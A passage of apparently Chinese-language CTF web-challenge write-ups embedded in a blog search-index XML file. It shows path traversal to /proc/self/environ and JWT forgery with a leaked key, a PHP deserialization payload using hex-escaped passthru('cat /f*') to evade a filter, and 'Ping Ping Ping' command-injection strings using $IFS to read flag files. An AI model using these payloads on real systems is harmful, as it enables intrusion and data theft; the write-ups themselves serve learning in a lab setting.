jsonify(response1)</span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br></pre></td></tr></table></figure><p>要目录穿透?a&#x3D;..&#x2F;..&#x2F;..&#x2F;???????</p><img src="11d98589587d850441e418378bf25e39.png" alt="11d98589587d850441e418378bf25e39.png" /><p>留意一下這一句:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br></pre></td></tr></table></figure><p>這一句是指在linux下的&#x2F;proc&#x2F;self&#x2F;environ有放key , 可以在?file&#x3D; &#x2F;proc&#x2F;self&#x2F;environ找到</p><p>最後在&#x2F;proc&#x2F;self&#x2F;environ 找到了KEY</p><img src="5643d3d71c222dfc43591b4449fed24c.png" alt="5643d3d71c222dfc43591b4449fed24c.png" /><p>SECRET_KEY&#x3D;B3@uTy_L1es_IN_7he_EyEs_0f_Th3_BEh0ld3r</p><p>這樣就可以jwt偽造了 , </p><img src="1b29cf97eba9760613949894d4a72e3f.png" alt="1b29cf97eba9760613949894d4a72e3f.png" /><p>簡單寫一下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;B3@uTy_L1es_IN_7he_EyEs_0f_Th3_BEh0ld3r&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;Plato&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;ideal_state&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成token</span></span><br><span class="line">token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, SECRET_KEY, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlBsYXRvIiwicGFzc3dvcmQiOiJpZGVhbF9zdGF0ZSJ9.LpctUZCUocsntlZ7kNWh9KsagP4CMcELs_bt1g_4A-M</span><br></pre></td></tr></table></figure><h2 id="29-Maxser-Revenge"><a href="#29-Maxser-Revenge" class="headerlink" title="29.Maxser Revenge"></a>29.Maxser Revenge</h2><p>是一個php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;check.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dir=<span class="string">&#x27;notion&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;S);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">来吧，湮灭极限!</span><br></pre></td></tr></table></figure><p>是一個反序列化php </p><p>來打開phpstudy 生成 NSS的參數</p><p>目標是eval(system(“ls &#x2F;“))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">passthru</span>() ;</span><br><span class="line"><span class="variable">$a</span>-&gt;S = <span class="string">&quot;system(&#x27;ls /&#x27;)&quot;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo serialize($a) ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="2ba80e6f30589677a856d9ad50d69064.png" alt="2ba80e6f30589677a856d9ad50d69064.png" /><p>发现有正则绕过“&#x2F;[A-Za-z_$()]+&#x2F;” 需要过滤字母:</p><p>16進制轉文本:<br><img src="572046fd972c87d3ee5775239a1d7d79.png" alt="572046fd972c87d3ee5775239a1d7d79.png" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;passthru&quot;:2:&#123;s:1:&quot;S&quot;;s:14:\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x20\x2f\x27\x29;s:3:&quot;dir&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>hex還是字母 , </p><p>看了看其他師傅的wp , passthru可以进行命令执行 , ls中l转16进制不行 就直接cat &#x2F;f*</p><p>(&#x2F;和可以直接用，不用转16进制)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\70\61\73\73\74\68\72\75\28\27\63\61\74\20/\66*\27\29;</span><br></pre></td></tr></table></figure><img src="a4785abc923a2e43feb01011e377f5d4.png" alt="a4785abc923a2e43feb01011e377f5d4.png" /><p>构造payload,记得s:19:要改为S:19:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">passthru</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;S = <span class="string">&quot;passthru(&#x27;cat /f*&#x27;);&quot;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#echo  base64_encode(serialize($a));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;passthru&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>;S:<span class="number">20</span>:<span class="string">&quot;\70\61\73\73\74\68\72\75\28\27\63\61\74\20/\66*\27\29;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;dir&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><img src="25f376dd0b5cc047ca0951ac84059a34.png" alt="25f376dd0b5cc047ca0951ac84059a34.png" /><h2 id="30-Ping-Ping-Ping"><a href="#30-Ping-Ping-Ping" class="headerlink" title="30.Ping Ping Ping"></a>30.Ping Ping Ping</h2><img src="349142a23ffb190571f209f91cd0f173.png" alt="349142a23ffb190571f209f91cd0f173.png" /><img src="ceba1696d51eae85a3820a0d00ef3ab3.png" alt="ceba1696d51eae85a3820a0d00ef3ab3.png" /><p>空格和flag被ban了</p><img src="5ce731b01dcdbd163cf01d3cfd2fff87.png" alt="5ce731b01dcdbd163cf01d3cfd2fff87.png" /><p>symbol被ban了 , </p><p>127.0.0.1|ls</p><img src="d5fbcd5e74f7beb3f974da2202f2b978.png" alt="d5fbcd5e74f7beb3f974da2202f2b978.png" /><p>用$IFS代替空格  </p><p>$9 代替 &#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat$IFS$9index.php</span><br></pre></td></tr></table></figure><img src="224ce82d74ce207b444dab02cc62293d.png" alt="224ce82d74ce207b444dab02cc62293d.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;q=g;cat$IFS$9fla$q.php</span><br></pre></td></tr></table></figure><img src="42eab3f9433044da14d296dd6bb8f8e3.png" alt="42eab3f9433044da14d296dd6bb8f8e3.png" />]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
